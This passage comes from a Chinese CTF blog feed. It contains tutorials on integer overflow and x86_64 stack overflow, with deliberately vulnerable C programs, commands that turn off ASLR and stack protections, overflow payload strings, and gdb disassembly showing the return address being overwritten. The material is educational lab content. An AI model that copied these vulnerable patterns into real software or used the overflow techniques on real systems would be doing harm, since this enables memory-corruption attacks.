&lt;printf@plt&gt;</span><br><span class="line">   0x0000000000001216 &lt;+173&gt;:nop</span><br><span class="line">   0x0000000000001217 &lt;+174&gt;:leave  </span><br><span class="line">   0x0000000000001218 &lt;+175&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在整数转换的过程中，有可能导致下面的错误：</p><ul><li>损失值：转换为值的大小不能表示的一种类型</li><li>损失符号：从有符号类型转换为无符号类型，导致损失符号</li></ul><h3 id="25-漏洞多发函数"><a class="markdownIt-Anchor" href="#25-漏洞多发函数"></a> 2.5 漏洞多发函数</h3><p>我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个 <code>size_t</code> 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>memcpy()</code> 函数将 <code>src</code> 所指向的字符串中以 <code>src</code> 地址开始的前 <code>n</code> 个字节复制到 <code>dest</code> 所指的数组中，并返回 <code>dest</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>strncpy()</code> 函数从源 <code>src</code> 所指的内存地址的起始位置开始复制 <code>n</code> 个字节到目标 <code>dest</code> 所指的内存地址的起始位置中。</p><p>两个函数中都有一个类型为 <code>size_t</code> 的参数，它是无符号整型的 <code>sizeof</code> 运算符的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br></pre></td></tr></table></figure><h2 id="3-整数溢出示例"><a class="markdownIt-Anchor" href="#3-整数溢出示例"></a> 3. 整数溢出示例</h2><p>现在我们已经知道了整数溢出的原理和主要形式，下面我们先看几个简单示例，然后实际操作利用一个整数溢出漏洞。</p><h3 id="31-示例"><a class="markdownIt-Anchor" href="#31-示例"></a> 3.1 示例</h3><p>示例一，整数转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">80</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;length too large: bad dog, no cookie for you!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, p, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子的问题在于，如果攻击者给 <code>len</code> 赋于了一个负数，则可以绕过 <code>if</code> 语句的检测，而执行到 <code>memcpy()</code> 的时候，由于第三个参数是 <code>size_t</code> 类型，负数 <code>len</code> 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大量的内容到 <code>buf</code> 中，引发了缓冲区溢出。</p><p>示例二，回绕和溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="comment">// int len;</span></span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line"></span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len + <span class="number">5</span>);</span><br><span class="line">    read(fd, buf, len);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子看似避开了缓冲区溢出的问题，但是如果 <code>len</code> 过大，<code>len+5</code> 有可能发生回绕。比如说，在 x86-32 上，如果 <code>len = 0xFFFFFFFF</code>，则 <code>len+5 = 0x00000004</code>，这时 <code>malloc()</code> 只分配了 4 字节的内存区域，然后在里面写入大量的数据，缓冲区溢出也就发生了。（如果将 <code>len</code> 声明为有符号 <code>int</code> 类型，<code>len+5</code> 可能发生溢出）</p><p>示例三，截断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, argv[<span class="number">2</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参数连接到尾部。如果攻击者提供的两个字符串总长度无法用 <code>total</code> 表示，则会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序中 <code>strlen()</code> 返回类型是 <code>size_t</code>，却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值（256 字节）的数据都会导致截断异常。当密码长度为 261 时，截断后值变为 5，成功绕过了 <code>if</code> 的判断，导致栈溢出。下面我们利用溢出漏洞来获得 shell。</p><p>编译命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0&gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure><p>使用 gdb 反汇编 <code>validate_passwd</code> 函数。<mark>rdi,rsi,rdx,rcx,r8,r9</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble validate_passwd</span><br><span class="line">Dump of assembler code for function validate_passwd:</span><br><span class="line">   0x0000000000001189 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000118d &lt;+4&gt;:push   rbp; 压入ebp</span><br><span class="line">   0x000000000000118e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001191 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   0x0000000000001195 &lt;+12&gt;:mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">   0x0000000000001199 &lt;+16&gt;:mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x000000000000119d &lt;+20&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011a0 &lt;+23&gt;:call   0x1090 &lt;strlen@plt&gt;</span><br><span class="line">   0x00000000000011a5 &lt;+28&gt;:mov    BYTE PTR [rbp-0x1],al; 将len存入[rbp-0x1]</span><br><span class="line">   0x00000000000011a8 &lt;+31&gt;:cmp    BYTE PTR [rbp-0x1],0x3</span><br><span class="line">   0x00000000000011ac &lt;+35&gt;:jbe    0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011ae &lt;+37&gt;:cmp    BYTE PTR [rbp-0x1],0x8</span><br><span class="line">   0x00000000000011b2 &lt;+41&gt;:ja     0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011b4 &lt;+43&gt;:lea    rdi,[rip+0xe49]        # 0x2004</span><br><span class="line">   0x00000000000011bb &lt;+50&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011c0 &lt;+55&gt;:mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x00000000000011c4 &lt;+59&gt;:lea    rax,[rbp-0xc]; 取passwd_buf地址</span><br><span class="line">   0x00000000000011c8 &lt;+63&gt;:mov    rsi,rdx; 传入参数passwd_buf</span><br><span class="line">   0x00000000000011cb &lt;+66&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011ce &lt;+69&gt;:call   0x1070 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011d3 &lt;+74&gt;:jmp    0x11e2 &lt;validate_passwd+89&gt;</span><br><span class="line">   0x00000000000011d5 &lt;+76&gt;:lea    rdi,[rip+0xe2e]        # 0x200a</span><br><span class="line">   0x00000000000011dc &lt;+83&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011e1 &lt;+88&gt;:nop</span><br><span class="line">   0x00000000000011e2 &lt;+89&gt;:nop</span><br><span class="line">   0x00000000000011e3 &lt;+90&gt;:leave  </span><br><span class="line">   0x00000000000011e4 &lt;+91&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>通过阅读反汇编代码，我们知道缓冲区 <code>passwd_buf</code> 位于 <code>rbp-0xc</code> 的位置（<code>0x00000000000011c4&lt;+71&gt;: lea eax,[rbp-0xc]</code>），而返回地址在 <code>rbp+8</code> 的位置，所以返回地址相对于缓冲区 <code>0x14</code> 的位置。我们测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef$ r `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">Starting program: /home/sakura/文档/vuln `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">good!</span><br></pre></td></tr></table></figure><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/image-20220810163653885.png" alt="image-20220810163653885"></p><p>可以看到 <code>EIP</code> 被 <code>BBBBBBBB</code> 覆盖，相当于我们获得了返回地址的控制权。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-什么是整数溢出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是整数溢出&quot;&gt;&lt;/a&gt; 1. 什么是整数溢出&lt;/h2&gt;
&lt;h3 id=&quot;11-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="整数安全" scheme="https://www.rgzzplus.com/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出x86_64</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/</id>
    <published>2022-08-27T04:45:51.000Z</published>
    <updated>2022-08-27T04:47:22.175Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-x86和x86_64的区别"><a class="markdownIt-Anchor" href="#1-x86和x86_64的区别"></a> 1. x86和x86_64的区别</h2><p>第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也<strong>只能使用前47位</strong>，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。</p><p>事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。</p><h2 id="2-漏洞代码片段"><a class="markdownIt-Anchor" href="#2-漏洞代码片段"></a> 2. 漏洞代码片段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bof.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; </span><br><span class="line">      <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">      <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buffer);</span><br><span class="line">      <span class="built_in">strcpy</span>(buffer,  argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意：<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（需要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY，PIE等栈相关保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gcc bof.c -o bof -z execstack -fno-stack-protector -g</span><br></pre></td></tr></table></figure><h2 id="3-触发漏洞"><a class="markdownIt-Anchor" href="#3-触发漏洞"></a> 3. 触发漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ ./bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffddb0</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure><p>我们用 gdb 调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gdb-gef bof</span><br><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00005555555551a9 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x00005555555551ad &lt;+4&gt;:push   rbp</span><br><span class="line">   0x00005555555551ae &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x00005555555551b1 &lt;+8&gt;:sub    rsp,0x110</span><br><span class="line">   0x00005555555551b8 &lt;+15&gt;:mov    DWORD PTR [rbp-0x104],edi</span><br><span class="line">   0x00005555555551be &lt;+21&gt;:mov    QWORD PTR [rbp-0x110],rsi</span><br><span class="line">   0x00005555555551c5 &lt;+28&gt;:cmp    DWORD PTR [rbp-0x104],0x2</span><br><span class="line">   0x00005555555551cc &lt;+35&gt;:je     0x5555555551d8 &lt;main+47&gt;</span><br><span class="line">   0x00005555555551ce &lt;+37&gt;:mov    edi,0x0</span><br><span class="line">   0x00005555555551d3 &lt;+42&gt;:call   0x5555555550b0 &lt;exit@plt&gt;</span><br><span class="line">   0x00005555555551d8 &lt;+47&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x00005555555551df &lt;+54&gt;:mov    rsi,rax</span><br><span class="line">   0x00005555555551e2 &lt;+57&gt;:lea    rdi,[rip+0xe1b]        # 0x555555556004</span><br><span class="line">   0x00005555555551e9 &lt;+64&gt;:mov    eax,0x0</span><br><span class="line">   0x00005555555551ee &lt;+69&gt;:call   0x5555555550a0 &lt;printf@plt&gt;</span><br><span class="line">   0x00005555555551f3 &lt;+74&gt;:mov    rax,QWORD PTR [rbp-0x110]</span><br><span class="line">   0x00005555555551fa &lt;+81&gt;:add    rax,0x8</span><br><span class="line">   0x00005555555551fe &lt;+85&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000555555555201 &lt;+88&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x0000555555555208 &lt;+95&gt;:mov    rsi,rdx</span><br><span class="line">   0x000055555555520b &lt;+98&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555520e &lt;+101&gt;:call   0x555555555080 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0000555555555213 &lt;+106&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x000055555555521a &lt;+113&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555521d &lt;+116&gt;:call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555555222 &lt;+121&gt;:mov    eax,0x0</span><br><span class="line">   0x0000555555555227 &lt;+126&gt;:leave  </span><br><span class="line">=&gt; 0x0000555555555228 &lt;+127&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gef➤  b strcpy</span><br><span class="line">gef➤  b puts</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Breakpoint 2, 0x00007ffff7e3a420 in puts () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x16</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdd28  →  0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffde40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00007fffffffe3c0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e3a420  →  &lt;puts+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdd28│+0x0000: 0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0 ← $rsp</span><br><span class="line">0x00007fffffffdd30│+0x0008: 0x00007fffffffdf38  →  0x00007fffffffe289  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdd38│+0x0010: 0x0000000200000340</span><br><span class="line">0x00007fffffffdd40│+0x0018: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot; ← $rax, $rdi</span><br><span class="line">0x00007fffffffdd48│+0x0020: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd50│+0x0028: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd58│+0x0030: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd60│+0x0038: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e3a40f &lt;popen+143&gt;      jmp    0x7ffff7e3a3e4 &lt;popen+100&gt;</span><br><span class="line">   0x7ffff7e3a411                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7e3a41b                  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e3a420 &lt;puts+0&gt;         endbr64 